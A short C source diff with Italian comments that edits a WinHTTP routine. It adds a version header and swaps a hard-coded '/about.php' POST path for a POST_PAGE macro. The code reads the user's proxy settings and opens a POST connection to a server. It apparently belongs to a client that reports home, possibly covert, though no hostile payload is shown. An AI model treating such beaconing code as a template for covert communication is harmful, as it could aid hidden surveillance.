@@ -9,6 +9,7 @@
 #include "debug.h"
 #include "winhttp.h"
 
+#include "version.h"
 HINTERNET hGlobalInternet = 0;
 HINTERNET hSession = 0;
 HINTERNET hConnect = 0;
@@ -117,7 +118,6 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 
 	// Crea una sessione per winhttp.
 	hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
-	
 
 	// Cerca nel registry le configurazioni del proxy
 	if (hSession && WinHttpGetIEProxyConfigForCurrentUser(&pProxyConfig)) 
@@ -208,7 +208,7 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 	if (!(hConnect = WinHttpConnect(hSession, (LPCWSTR)_wHost, INTERNET_DEFAULT_HTTP_PORT, 0)))
 		return FALSE;
 
-	if (!(hGlobalInternet = WinHttpOpenRequest(hConnect, L"POST", L"/about.php", NULL, WINHTTP_NO_REFERER, (LPCWSTR *) wTypes, 0)))
+	if (!(hGlobalInternet = WinHttpOpenRequest(hConnect, L"POST", POST_PAGE, NULL, WINHTTP_NO_REFERER, (LPCWSTR *) wTypes, 0)))
 	{
 #ifdef _DEBUG
 		OutputDebug(L"[!!] WinHttpOpenRequest FAILED\n");
